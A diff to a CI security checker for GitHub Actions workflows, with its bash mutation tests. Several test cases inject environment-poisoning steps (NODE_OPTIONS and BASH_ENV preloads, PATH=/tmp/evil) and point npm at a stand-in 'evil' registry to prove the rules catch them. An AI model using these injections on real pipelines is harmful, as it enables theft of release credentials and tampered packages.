+        } else if (allow.free.includes(c.name)) used.free.add(c.name);
+        else out.push(label + " runs " + c.name + ", which is not on the " + name + " list (#1029)");
+        if (c.name === "printf" && c.words.some((w) => /^-v/.test(w))) out.push(label + " runs printf -v, which sets a variable this rule cannot see (#1029)");
+      }
+    }
+    // Exactly what the job runs: nothing listed that no step uses.
+    const stale = (kind, x) => out.push(name + ": runAllow lists the " + kind + " " + JSON.stringify(x) + ", which no step of the job runs any more: remove it (#1029)");
+    for (const x of allow.free) if (!used.free.has(x)) stale("command", x);
+    for (const forms of Object.values(allow.pinned)) for (const f of forms) if (!used.forms.has(f)) stale("form", f);
+    for (const x of allow.funcs) if (!used.funcs.has(x)) stale("function", x);
+    for (const x of allow.arrays) if (!used.arrays.has(x)) stale("array", x);
+    for (const x of allow.fors) if (!used.fors.has(x)) stale("for list", x);
+    for (const x of allow.calls) if (!used.calls.has(x)) stale("call", x);
+    for (const x of allow.assigns) if (!used.assigns.has(x)) stale("assignment", x);
+  }
+}
 if (rule === "scoped" && doc.permissions === undefined)
   for (const [name, job] of Object.entries(jobs))
     if (job.permissions === undefined)
@@ -163,7 +760,30 @@ if (rule === "authority") {
       triggers.includes("pull_request_target") || secret || Object.values(jobs).some((j) => j.secrets === "inherit"))
     out.push("yes");
 }
+if (rule === "reach") {
+  // Prints "yes" when a push or a pull request can start the workflow (#984).
+  // The triggers that cannot are listed, not the ones that can: an event
+  // added later (workflow_run, merge_group, a workflow_call from a PR
+  // workflow, a repository_dispatch the PAT can send) counts until it is
+  // argued for here. Branch and path filters are not read: a bot PR touches
+  // whatever its workflow adds, and a filter is not a boundary.
+  const on = doc.on ?? doc[true] ?? {};
+  const triggers = typeof on === "string" ? [on] : Array.isArray(on) ? on : Object.keys(on);
+  const quiet = new Set(["schedule", "workflow_dispatch"]);
+  if (!triggers.length || triggers.some((t) => !quiet.has(String(t)))) out.push("yes");
+}
+if (rule === "opens-pr") {
+  // Prints "yes" when a step, local actions included, is create-pull-request:
+  // every such workflow is held to catalog-pr below (#983), not a list. And
+  // "gh" when a run: opens one through gh or the pulls API instead (review
+  // of #983), which catalog-pr cannot read: those are listed below.
+  const steps = Object.values(jobs).flatMap((job) => flatSteps(job.steps).map((x) => x.st));
+  if (steps.some((st) => String(st.uses ?? "").toLowerCase().startsWith("peter-evans/create-pull-request@"))) out.push("yes");
+  else if (steps.some((st) => typeof st.run === "string" && /\bgh\s+pr\s+create\b|\bgh\s+api\b[^\n]*\/pulls\b/.test(st.run))) out.push("gh");
+}
 if (rule === "catalog-pr") {
+  // Every bot PR (#983: the webview_go bump too, since #981 the catalog), as
+  // the catalog PR was first:
   // The catalog PR is opened with RELEASE_PR_TOKEN, never GITHUB_TOKEN: GitHub
   // holds the CI of a PR that GITHUB_TOKEN opens or pushes for approval, so
   // main never sees its required `test` check and the PR cannot merge (#935).
@@ -221,6 +841,14 @@ if (rule === "untrusted") {
   const bunInstall = new RegExp("\\bbun" + flags + "\\s+(?:install|i)\\b");
   const frozen = /--frozen-lockfile(?![=\w-])/;
   const thirdParty = /\bscripts\/(sync-pieces-catalog|inspect-verified-pieces)\.ts\b/;
+  // #983: a Go build, vet or test compiles and runs module code (the webview
+  // bump links fresh upstream code into the sidecar tests), and a script of
+  // this repository (scripts/vendor-webview.sh fetches that upstream code)
+  // is repository code. Neither runs where a write scope or a secret is held.
+  // go -C dir test, and go tool, too; a script path behind a directory
+  // ($GITHUB_WORKSPACE/scripts/x, .github/scripts/x) too (review of #983).
+  const goCode = /(?:^|[\s;&|(])go\s+(?:-C\s+\S+\s+)?(?:build|test|vet|run|generate|install|get|mod|tool)\b/;
+  const repoScript = /(?:^|[\s;&|(\/])(?:\.\/)?scripts\/[\w.\/-]+/;
   // One logical line per command: continuations joined, comments dropped, and
   // quoted text blanked so an `echo "bun install failed"` is not an install.
   let pkgScripts = {};
@@ -273,6 +901,8 @@ if (rule === "untrusted") {
         const holding = writes(perm) ? JSON.stringify(perm) : "a secret other than GITHUB_TOKEN";
         if (held && install.test(bare)) out.push(label + via + ": installs dependencies in a job holding " + holding + ": " + t);
         if (held && thirdParty.test(bare)) out.push(label + via + ": processes third-party data in a job holding " + holding + ": " + t);
+        if (held && goCode.test(bare)) out.push(label + via + ": builds or tests Go code (module code is compiled or run) in a job holding " + holding + ": " + t);
+        if (held && repoScript.test(bare)) out.push(label + via + ": runs a repository script in a job holding " + holding + ": " + t);
         // The write job takes generated TypeScript from a read-only job, and
         // the first thing to run it must be the PR CI, not this job: no
         // JavaScript runtime at all here, whatever script it is pointed at.
@@ -588,7 +1218,31 @@ if (rule === "narrow") {
     // these jobs use today (knownEnv): a new one has to be argued for here.
     // And no container: or services: at all: container options pass any
     // docker flag, --env included, and the image runs every step.
-    if (oidc && typeof job.uses !== "string") {
+    // #1030: and in a job that installs npm from the checked tarball or
+    // runs npm pack, though it holds no id-token: pack-brain does both, and
+    // publish-brain publishes what it packed. Identified by the commands, not
+    // the job name, so a job renamed or added that packs is held too. What
+    // this buys is narrow: the install and pack steps run as written, with
+    // no BASH_ENV, PATH, NODE_OPTIONS or GITHUB_ENV line in front of them, so
+    // the npm integrity check (#1000) and the pack are what the script says.
+    // It does not stop code running in that job: bun install runs dependency
+    // lifecycle scripts and prepublishOnly runs repository code there by
+    // design (#682), and either can change what is packed. The digest check
+    // in publish-brain proves only that the tarball was not swapped after
+    // the pack, not that the pack ran clean code.
+    const npmInstallLine = "npm install -g --offline --ignore-scripts \"$npm_tgz\"";
+    // Continuation lines joined, so `npm \` then `pack` on the next is a pack.
+    // Options before the verb may take a value (npm --loglevel silent pack, review of #1030).
+    const packRe = cmd("npm(?:\\s+-\\S+(?:\\s+[^-\\s]\\S*)?)*\\s+pack\\b");
+    // Quotes and backslashes dropped for the pack test, as bash drops them
+    // ("npm" pack and n\\pm pack are npm pack), and bun pm pack is a pack too
+    // (security review of #1030). A verb that comes from a variable is not
+    // seen.
+    const bunPackRe = cmd("bun(?:\\s+-\\S+(?:\\s+[^-\\s]\\S*)?)*\\s+pm\\s+pack\\b");
+    const packs = runs.replace(/\\\n/g, " ").split("\n").map((l) => stripComment(l).trim()).some((l) => l === npmInstallLine ||
+      packRe.test(l.replace(/["\x27\\]/g, "")) || bunPackRe.test(l.replace(/["\x27\\]/g, "")));
+    const heldBy = oidc ? "a job holding id-token" : "a job that installs npm from its checked tarball or runs npm pack (#1030)";
+    if ((oidc || packs) && typeof job.uses !== "string") {
       const poison = /^(?:BASH_ENV|ENV|PATH|NODE_OPTIONS|LD_[A-Z0-9_]+|BASH_FUNC_.+|SHELLOPTS|BASHOPTS|PS4|(?:HTTPS?|ALL|NO|FTP)_PROXY|NODE_EXTRA_CA_CERTS|NODE_TLS_REJECT_UNAUTHORIZED|SSL_CERT_(?:FILE|DIR)|CURL_CA_BUNDLE|CURL_HOME|HOME|XDG_CONFIG_HOME|NODE_PATH|CDPATH|TMPDIR|OPENSSL_(?:CONF|MODULES|ENGINES)|GITHUB_.+|RUNNER_.+|ACTIONS_.+)$/i;
       // One set for all of these jobs: every name in it must mean nothing to
       // bash, node, npm, curl, git, glibc or the runner, only to scripts of
@@ -604,8 +1258,8 @@ if (rule === "narrow") {
         // The Windows signers.
         "GCP_KMS_KEYRING", "ALLOW_UNSIGNED_WINDOWS", "GCP_ACCESS_TOKEN", "GCP_KMS_KEY_ALIAS",
       ]);
-      if (job.container !== undefined) out.push(name + ": runs in a container: in a job holding id-token");
-      if (job.services !== undefined) out.push(name + ": runs services: in a job holding id-token");
+      if (job.container !== undefined) out.push(name + ": runs in a container: in " + heldBy);
+      if (job.services !== undefined) out.push(name + ": runs services: in " + heldBy);
       const plainShell = ["bash", "sh", "bash -e {0}", "sh -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
       const fsteps = flatSteps(job.steps);
       const stepLabel = (st, via, i) => "step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
@@ -614,11 +1268,11 @@ if (rule === "narrow") {
       for (const [lvl, e] of levels) {
         if (e === undefined || e === null) continue;
         if (typeof e !== "object" || Array.isArray(e)) {
-          out.push(name + ": " + lvl + " env is " + JSON.stringify(e) + ", not a mapping this rule can read, in a job holding id-token");
+          out.push(name + ": " + lvl + " env is " + JSON.stringify(e) + ", not a mapping this rule can read, in " + heldBy);
           continue;
         }
         for (const k of Object.keys(e))
-          if (poison.test(k)) out.push(name + ": " + lvl + " env sets " + k + " in a job holding id-token");
+          if (poison.test(k)) out.push(name + ": " + lvl + " env sets " + k + " in " + heldBy);
           else if (!knownEnv.has(k)) out.push(name + ": " + lvl + " env sets " + k + ", a name no job holding id-token uses yet: set it at the level of the job that reads it, or add it to knownEnv with a reason");
       }
       // ...nor set in the script itself (review of #999): an assignment or
@@ -626,15 +1280,15 @@ if (rule === "narrow") {
       for (const [i, { st, via }] of fsteps.entries()) {
         const run = (typeof st.run === "string" ? st.run : "").replace(/\\\n/g, " ").split("\n").map(stripComment).join("\n");
         for (const m of run.matchAll(/(?:^|[\s;&|(`])(?:(?:export|declare|typeset|local|readonly|env)\s+(?:-\w+\s+)*)?([A-Za-z_][A-Za-z0-9_]*)\+?=/gm))
-          if (poison.test(m[1])) out.push(name + ": " + stepLabel(st, via, i) + " sets " + m[1] + " in its script, in a job holding id-token");
+          if (poison.test(m[1])) out.push(name + ": " + stepLabel(st, via, i) + " sets " + m[1] + " in its script, in " + heldBy);
       }
       for (const [i, { st, via }] of fsteps.entries()) {
         const text = [typeof st.run === "string" ? st.run : "", ...Object.values(st.env && typeof st.env === "object" ? st.env : {}).map(String)].join("\n");
         if (/GITHUB_(?:ENV|PATH)\b|_runner_file_commands/i.test(text))
-          out.push(name + ": " + stepLabel(st, via, i) + " writes GITHUB_ENV or GITHUB_PATH (env for every later step) in a job holding id-token");
+          out.push(name + ": " + stepLabel(st, via, i) + " writes GITHUB_ENV or GITHUB_PATH (env for every later step) in " + heldBy);
         const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
         if (sh !== undefined && !plainShell.includes(String(sh).trim()))
-          out.push(name + ": " + stepLabel(st, via, i) + " runs in shell: " + sh + " in a job holding id-token");
+          out.push(name + ": " + stepLabel(st, via, i) + " runs in shell: " + sh + " in " + heldBy);
       }
     }
     // publish-brain is the tarball-only shape (#682): no checkout, nothing
@@ -1086,13 +1740,18 @@ expect_caught() {
 const s = await Bun.file(process.env.FROM).text();
 const n = s.split(process.env.OLD).length - 1;
 if (n < 1) { console.error("anchor not found"); process.exit(2); }
-await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 		no "mutant '$1' could be applied (the workflow no longer has the text it mutates)"
 		return
 	fi
 	local found
-	found="$(check "$2" "$copy")"
+	# A mutant the check cannot read (a YAML error) proves nothing, and used
+	# to read as "passed" (#1029 found one, mangled by a $ in the replacement).
+	found="$(check "$2" "$copy")" || {
+		no "reports: $1" "the check could not read the mutated workflow: ${found}"
+		return
+	}
 	if [ -z "$found" ]; then
 		no "reports: $1" "the check passed a workflow with this hole"
 	elif [ -n "${6:-}" ] && ! grep -qF -- "$6" <<<"$found"; then
@@ -1113,18 +1772,86 @@ echo "the publish path holds nothing by default"
 expect_clean "release-exec.yml: permissions {} at the top, every job explicit" publish-perms "$WORKFLOWS/release-exec.yml"
 
 echo
-echo "every action in a workflow that holds authority is pinned to a commit"
+echo "every action in a workflow that holds authority, or that a push or a PR can start, is pinned to a commit"
 held=0
+reached=()
+authed=()
+pinchecked=()
 for f in "$WORKFLOWS"/*.yml; do
 	auth="$(check authority "$f")" || {
 		no "$(basename "$f"): authority check ran" "the bun helper failed"
 		continue
 	}
+	reach="$(check reach "$f")" || {
+		no "$(basename "$f"): reach check ran" "the bun helper failed"
+		continue
+	}
+	[ -n "$reach" ] && reached+=("$(basename "$f")")
+	[ -n "$auth" ] && authed+=("$(basename "$f")")
+	[ -n "$auth" ] || [ -n "$reach" ] || continue
+	pinchecked+=("$(basename "$f")")
+	expect_clean "$(basename "$f")" pinned "$f"
 	[ -n "$auth" ] || continue
 	held=$((held + 1))
-	expect_clean "$(basename "$f")" pinned "$f"
 	expect_clean "$(basename "$f"): fetches nothing by a floating version or an undigested image" mutable "$f"
 done
+# The two PR workflows that hold no authority, which only the reach
+# derivation brings under the pin (#984): read from what the loop above
+# pin-checked, not from what reach answered, so a loop that stopped
+# applying the pin to reached workflows fails here (review of #984).
+for f in docker-build.yml test.yml; do
+	if printf '%s\n' "${pinchecked[@]}" | grep -qxF "$f"; then
+		ok "the pin rule is applied to ${f}, which a PAT-opened PR starts (#984)"
+	else
+		no "the pin rule is applied to ${f}, which a PAT-opened PR starts (#984)" "pin-checked: ${pinchecked[*]}"
+	fi
+done
+# ...and to exactly the workflows that hold authority or that a push or a
+# PR can start, no fewer.
+want="$(printf '%s\n' "${authed[@]}" "${reached[@]}" | sed '/^$/d' | LC_ALL=C sort -u | tr '\n' ' ')"
+got="$(printf '%s\n' "${pinchecked[@]}" | LC_ALL=C sort -u | tr '\n' ' ')"
+if [ -n "$want" ] && [ "$got" = "$want" ]; then
+	ok "the pin rule is applied to every workflow that holds authority or that a push or a PR can start (#984)"
+else
+	no "the pin rule is applied to every workflow that holds authority or that a push or a PR can start (#984)" "wanted: ${want}; pin-checked: ${got}"
+fi
+# Every loop here reads *.yml, and GitHub runs *.yaml from the same
+# directory too, so one named that way would pass every rule unread
+# (security review of #984). None may exist.
+# yaml_check <dir>: the .yaml files in it, one per line.
+yaml_check() { find "$1" -maxdepth 1 -name '*.yaml' -printf '%f\n'; }
+found="$(yaml_check "$WORKFLOWS")"
+if [ -z "$found" ]; then ok "no workflow is named *.yaml, which every rule here would skip (#984)"; else no "no workflow is named *.yaml, which every rule here would skip (#984)" "$found"; fi
+rm -rf "${WORK}/yamldir" && mkdir -p "${WORK}/yamldir" && cp "$WORKFLOWS/test.yml" "${WORK}/yamldir/evade.yaml"
+if [ "$(yaml_check "${WORK}/yamldir")" = "evade.yaml" ]; then ok "reports: a workflow named *.yaml (#984)"; else no "reports: a workflow named *.yaml (#984)"; fi
+# reach_case <label> <yes|no> <file> <exact text> <replacement>: the
+# derivation on a mutated copy, both ways, so it can be neither always yes
+# nor always no.
+reach_case() {
+	local copy="${WORK}/reach.yml"
+	if ! FROM="$3" TO="$copy" OLD="$4" NEW="$5" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+if (!s.includes(process.env.OLD)) process.exit(2);
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
+'; then
+		no "reach mutant '$1' could be applied (the workflow no longer has the text it mutates)"
+		return
+	fi
+	local got
+	got="$(check reach "$copy")" || got="(the bun helper failed)"
+	if { [ "$2" = yes ] && [ "$got" = yes ]; } || { [ "$2" = no ] && [ -z "$got" ]; }; then ok "reach: $1"; else no "reach: $1" "wanted ${2}, got: ${got:-nothing}"; fi
+}
+# docker-build.yml holds no authority, so every answer below is the
+# trigger derivation alone. Its `on:` key is renamed out of the way and a
+# new one put in front.
+reach_case 'a workflow only a schedule or a dispatch starts is not reached (#984)' no "$WORKFLOWS/docker-build.yml" \
+	$'\non:\n' $'\non:\n  schedule:\n    - cron: "0 0 * * *"\n  workflow_dispatch:\nx-was-on:\n'
+reach_case 'a workflow_run trigger, which a PR run can fire, is reached (#984)' yes "$WORKFLOWS/docker-build.yml" \
+	$'\non:\n' $'\non:\n  workflow_run:\n    workflows: [Tests]\nx-was-on:\n'
+reach_case 'a reusable workflow, which a PR workflow can call, is reached (#984)' yes "$WORKFLOWS/docker-build.yml" \
+	$'\non:\n' $'\non:\n  workflow_call:\n  workflow_dispatch:\nx-was-on:\n'
+reach_case 'a bare pull_request trigger is reached (#984)' yes "$WORKFLOWS/docker-build.yml" \
+	$'\non:\n' $'\non: pull_request\nx-was-on:\n'
 # Both npm publishers install the same npm, so a bump cannot leave one on
 # the version Trusted Publishing was proven with and the other not.
 npm_pins="$(for f in release-exec.yml sidecar-release.yml; do
@@ -1215,7 +1942,7 @@ npm_pin_caught() {
 		if ! FROM="${WORK}/npmpin/$1" OLD="$2" NEW="$3" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) process.exit(2);
-await Bun.write(process.env.FROM, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 			no "npm pin mutant '${label}' could be applied ($1 no longer has the text it mutates)"
 			return
@@ -1458,7 +2185,7 @@ dockerfile_caught() {
 	if ! FROM="${HERE}/../../Dockerfile" TO="$copy" OLD="$2" NEW="$3" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
-await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 		no "Dockerfile mutant '$1' could be applied (the Dockerfile no longer has the text it mutates)"
 		return
@@ -1550,7 +2277,7 @@ bun_pin_caught() {
 	if ! FROM="${WORK}/pins/$2" OLD="$3" NEW="$4" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
-await Bun.write(process.env.FROM, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 		no "Bun pin mutant '$1' could be applied (the file no longer has the text it mutates)"
 		return
@@ -1630,21 +2357,66 @@ done
 	expect_caught 'a cached build uploading the directory holding its output (#868 review)' pushcache "$WORKFLOWS/docker-build.yml" \
 		'      - name: Check the release cache guard has not been disarmed' $'      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: image\n          path: ${{ runner.temp }}\n      - name: Check the release cache guard has not been disarmed' \
 		'restores cache-from "type=gha" in a job that builds an image and uploads an artifact'
+	# The whole build step is replaced, so its text is read from the
+	# workflow (it carries the action SHA, which an anchor never spells).
+	build_step="$(FILE="$WORKFLOWS/docker-build.yml" bun -e '
+const s = await Bun.file(process.env.FILE).text();
+const a = s.indexOf("      - name: Build Docker image (validate)\n        uses: docker/build-push-action@");
+const end = "          cache-to: type=gha,mode=max\n";
+const b = s.indexOf(end, a);
+if (a < 0 || b < 0) process.exit(2);
+process.stdout.write(s.slice(a, b + end.length));
+')" || build_step="(the build step was not found)"
 	expect_caught 'a classic docker build with a cache, saved and uploaded (#868 review)' pushcache "$WORKFLOWS/docker-build.yml" \
-		$'      - name: Build Docker image (validate)\n        uses: docker/build-push-action@v7\n        with:\n          context: .\n          file: ./Dockerfile\n          platforms: linux/amd64\n          push: false\n          load: true\n          tags: ${{ env.IMAGE_TAG }}\n          build-args: VERSION=0.0.0-ci\n          cache-from: type=gha\n          cache-to: type=gha,mode=max\n' \
+		"$build_step"$'\n' \
 		$'      - run: docker build --cache-from jarvis:ci -t jarvis:ci . && docker save jarvis:ci -o i.tar\n      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: image\n          path: i.tar\n' \
 		'runs a build with --cache-from in a job that builds an image and uploads an artifact'
 }
 
 echo
-echo "the catalog sync processes third-party data without write access"
+echo "the catalog sync and the webview bump process third-party data without write access"
 expect_clean "sync-pieces-catalog.yml: no job that installs dependencies or runs the generator holds a write scope; installs are frozen" \
 	untrusted "$WORKFLOWS/sync-pieces-catalog.yml"
+expect_clean "update-webview.yml: no job that builds or tests upstream Go code, or runs a repository script, holds a write scope or a secret (#983)" \
+	untrusted "$WORKFLOWS/update-webview.yml"
 
 echo
-echo "the catalog PR is opened with a token whose CI runs"
-expect_clean "sync-pieces-catalog.yml: create-pull-request takes RELEASE_PR_TOKEN alone, after a step that refuses without it" \
-	catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml"
+echo "every PR opened with create-pull-request takes a token whose CI runs (#981, #983)"
+opens_pr=()
+opens_gh=()
+for f in "$WORKFLOWS"/*.yml; do
+	o="$(check opens-pr "$f")" || {
+		no "$(basename "$f"): opens-pr check ran" "the bun helper failed"
+		continue
+	}
+	[ -n "$o" ] || continue
+	if [ "$o" = gh ]; then opens_gh+=("$(basename "$f")"); continue; fi
+	opens_pr+=("$(basename "$f")")
+	expect_clean "$(basename "$f"): create-pull-request takes RELEASE_PR_TOKEN alone, after a step that refuses without it" catalog-pr "$f"
+done
+# Both bot PRs, found by the derivation, or it is broken rather than the
+# repository clean.
+if [ "$(printf '%s\n' "${opens_pr[@]}" | LC_ALL=C sort | tr '\n' ' ')" = "sync-pieces-catalog.yml update-webview.yml " ]; then
+	ok "the workflows that open a PR with create-pull-request are the catalog sync and the webview bump (#983)"
+else
+	no "the workflows that open a PR with create-pull-request are the catalog sync and the webview bump (#983)" "found: ${opens_pr[*]}"
+fi
+# A PR opened through gh is not read by catalog-pr. release.yml opens the
+# release PR that way, and its PAT is held instead by push_cred_check (read
+# exactly three times, for github.com alone) and its own refusal (#929).
+# Any other workflow doing so has to be argued for here.
+if [ "$(printf '%s\n' "${opens_gh[@]}" | sed '/^$/d' | LC_ALL=C sort | tr '\n' ' ')" = "release.yml " ]; then
+	ok "the only workflow that opens a PR through gh is release.yml (review of #983)"
+else
+	no "the only workflow that opens a PR through gh is release.yml (review of #983)" "found: ${opens_gh[*]}"
+fi
+copy="${WORK}/opens-gh.yml"
+# shellcheck disable=SC2016 # JavaScript source, not shell.
+FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+await Bun.write(process.env.TO, s.replace("\njobs:\n", () => "\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh pr create --fill\n"));
+'
+if [ "$(check opens-pr "$copy")" = gh ]; then ok "reports: a workflow that opens a PR through gh (review of #983)"; else no "reports: a workflow that opens a PR through gh (review of #983)"; fi
 
 echo
 echo "each rule reports the hole it exists for (mutated copies)"
@@ -1657,12 +2429,32 @@ expect_caught 'write scopes back at the top of the publish path' publish-perms "
 	$'permissions: {}\n' $'permissions:\n  contents: write\n'
 expect_caught 'a major tag on the publish path' pinned "$WORKFLOWS/release-exec.yml" \
 	'uses: softprops/action-gh-release@' 'uses: softprops/action-gh-release@v2 #'
-# A read-only workflow gaining a write scope must come under the pin rule:
-# test.yml still uses tags, so granting it write has to surface them.
+# #984: the PR workflows, which hold no authority, each back on a tag.
+expect_caught 'the image build of a catalog PR back on a tag (#984)' pinned "$WORKFLOWS/docker-build.yml" \
+	'uses: docker/build-push-action@' 'uses: docker/build-push-action@v7 #' \
+	'docker-build: uses docker/build-push-action@v7 (not a full commit SHA)'
+expect_caught 'the buildx setup of a catalog PR back on a tag (#984)' pinned "$WORKFLOWS/docker-build.yml" \
+	'uses: docker/setup-buildx-action@' 'uses: docker/setup-buildx-action@v4 #' \
+	'docker-build: uses docker/setup-buildx-action@v4 (not a full commit SHA)'
+expect_caught 'the checkout of a catalog PR image build back on a tag (#984)' pinned "$WORKFLOWS/docker-build.yml" \
+	'uses: actions/checkout@' 'uses: actions/checkout@v7 #' \
+	'docker-build: uses actions/checkout@v7 (not a full commit SHA)'
+expect_caught 'the test run of every PR back on a tag (#984)' pinned "$WORKFLOWS/test.yml" \
+	'uses: dorny/paths-filter@' 'uses: dorny/paths-filter@v4 #' \
+	'changes: uses dorny/paths-filter@v4 (not a full commit SHA)'
+# A read-only workflow gaining a write scope must come under the pin rule.
+# test.yml is pinned since #984, so the copy also takes one action back to a
+# tag; and the unmutated test.yml must hold no authority, or the yes below
+# would not be the write scope.
+if [ -z "$(check authority "$WORKFLOWS/test.yml")" ]; then
+	ok "test.yml, as committed, holds no authority (so the two cases below are the mutation)"
+else
+	no "test.yml, as committed, holds no authority (so the two cases below are the mutation)"
+fi
 copy="${WORK}/authority.yml"
 FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
 const s = await Bun.file(process.env.FROM).text();
-await Bun.write(process.env.TO, s.replace("permissions:\n  contents: read\n", "permissions:\n  contents: write\n"));
+await Bun.write(process.env.TO, s.replace("permissions:\n  contents: read\n", "permissions:\n  contents: write\n").replace("uses: actions/checkout@", "uses: actions/checkout@v7 #"));
 '
 if [ -n "$(check authority "$copy")" ] && [ -n "$(check pinned "$copy")" ]; then
 	ok "reports: a read-only workflow that gains a write scope while using tags"
@@ -1670,11 +2462,11 @@ else
 	no "reports: a read-only workflow that gains a write scope while using tags"
 fi
 # #687: a secret is authority on its own. test.yml stays read-only here and
-# only gains a secret reference; its tags must surface.
+# only gains a secret reference; its tag (put back, as above) must surface.
 # shellcheck disable=SC2016 # JavaScript source, not shell.
 FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
 const s = await Bun.file(process.env.FROM).text();
-await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  SOME_KEY: ${{ secrets.SOME_KEY }}\n"));
+await Bun.write(process.env.TO, s.replace("\nenv:\n", "\nenv:\n  SOME_KEY: ${{ secrets.SOME_KEY }}\n").replace("uses: actions/checkout@", "uses: actions/checkout@v7 #"));
 '
 if [ -n "$(check authority "$copy")" ] && [ -n "$(check pinned "$copy")" ]; then
 	ok "reports: a read-only workflow that reads a secret while using tags"
@@ -1692,11 +2484,27 @@ if [ -z "$(check authority "$copy")" ]; then
 else
 	no "a read-only workflow reading only secrets.GITHUB_TOKEN holds no authority"
 fi
-# #687: the pin rule descends into local composite actions. bun-setup still
-# uses tags, so an authority workflow that starts using it must be reported.
-expect_caught 'a local composite action with tagged actions, used where authority is held' pinned "$WORKFLOWS/release.yml" \
-	'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' '      - uses: ./.github/actions/bun-setup
-      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0'
+# #687: the pin rule descends into local composite actions. bun-setup is
+# pinned since #984, so a copy of the repository with its setup-bun back on
+# a tag stands in for it (the rule reads local actions from REPO_DIR).
+rm -rf "${WORK}/tagged-repo" && mkdir -p "${WORK}/tagged-repo/.github" && cp -R "${HERE}/../actions" "${WORK}/tagged-repo/.github/actions"
+if FROM="${WORK}/tagged-repo/.github/actions/bun-setup/action.yml" OLD='    - uses: oven-sh/setup-bun@' NEW='    - uses: oven-sh/setup-bun@v2 #' bun -e '
+const s = await Bun.file(process.env.FROM).text();
+if (!s.includes(process.env.OLD)) process.exit(2);
+await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
+'; then
+	REPO_DIR="${WORK}/tagged-repo" expect_caught 'a local composite action with tagged actions, used where authority is held' pinned "$WORKFLOWS/release.yml" \
+		'      - uses: oven-sh/setup-bun@' $'      - uses: ./.github/actions/bun-setup\n      - uses: oven-sh/setup-bun@' \
+		'(via ./.github/actions/bun-setup): uses oven-sh/setup-bun@v2 (not a full commit SHA)'
+	# ...and in the PR workflow that runs it, which holds no authority (#984).
+	if found="$(REPO_DIR="${WORK}/tagged-repo" check pinned "$WORKFLOWS/test.yml")" && grep -qF '(via ./.github/actions/bun-setup): uses oven-sh/setup-bun@v2 (not a full commit SHA)' <<<"$found"; then
+		ok "reports: a tag back in the composite action test.yml runs (#984)"
+	else
+		no "reports: a tag back in the composite action test.yml runs (#984)" "got: ${found}"
+	fi
+else
+	no "the bun-setup tag mutant could be applied (action.yml no longer has the text it mutates)"
+fi
 expect_caught 'a cached Bun inside a local composite action, used where authority is held' mutable "$WORKFLOWS/release.yml" \
 	'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' '      - uses: ./.github/actions/bun-setup
       - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0'
@@ -2207,6 +3015,194 @@ echo "no env in a job holding id-token names code to run first, and no step writ
 }
 
 echo
+echo "no env in the job that installs npm and packs the brain tarball names code to run first either (#1030)"
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	expect_caught 'BASH_ENV in the pack-brain job env (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'    needs: [validate-tag, test, smoke-image]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, test, smoke-image]\n    runs-on: ubuntu-latest\n    env:\n      BASH_ENV: /tmp/x\n' \
+		'pack-brain: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+	expect_caught 'an earlier pack-brain step writing NODE_OPTIONS to GITHUB_ENV (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		'      - name: Install the pinned npm' $'      - run: echo "NODE_OPTIONS=--require /tmp/x.js" >> "$GITHUB_ENV"\n      - name: Install the pinned npm' \
+		'pack-brain: step 3 writes GITHUB_ENV or GITHUB_PATH (env for every later step) in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+	expect_caught 'PATH in the env of the pack step (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Pack\n        id: pack\n' $'      - name: Pack\n        id: pack\n        env:\n          PATH: /tmp/evil:/usr/bin:/bin\n' \
+		'pack-brain: step Pack env sets PATH in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+	expect_caught 'npm pointed at another registry for the pack, a name no such job uses (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Pack\n        id: pack\n' $'      - name: Pack\n        id: pack\n        env:\n          npm_config_registry: https://registry.evil.example/\n' \
+		'pack-brain: step Pack env sets npm_config_registry, a name no job holding id-token uses yet'
